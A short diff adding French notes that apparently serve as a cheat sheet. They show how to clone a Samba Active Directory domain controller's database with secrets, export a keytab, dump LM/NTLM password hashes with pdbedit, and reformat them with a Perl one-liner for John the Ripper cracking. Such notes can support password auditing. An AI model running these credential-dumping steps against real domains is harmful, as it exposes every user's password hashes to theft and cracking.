@@ -1,0 +1,10 @@
+Pour cloner le DC (réplication) sans joindre le contrôleur :
+# samba-tool drs clone-dc-database --include-secrets --targetdir=/tmp/blah <REALM> --server=<SERVER> -U<USER>
+# samba-tool domain exportkeytab PATH_TO_KEYTAB --configfile=/tmp/blah/etc/smb.conf
+
+Pour obtenir les empreintes :
+# pdbedit -s /tmp/blah/etc/smb.conf -L -v
+# pdbedit -s /tmp/blah/etc/smb.conf -L -w
+
+Pour mettre les empreintes LM et NTLM au format John :
+# pdbedit -s /tmp/blah/etc/smb.conf -L -w | perl -e 'while (<>) { @smbpasswd = split(/:/, $_); print $smbpasswd[0] . ":" . $smbpasswd[1] . ":" . (($smbpasswd[2] eq "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX") ? "NO PASSWORD*********************" : $smbpasswd[2]) . ":" . (($smbpasswd[3] eq "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX") ? "NO PASSWORD*********************" : $smbpasswd[3]) . ":::\n"; }'
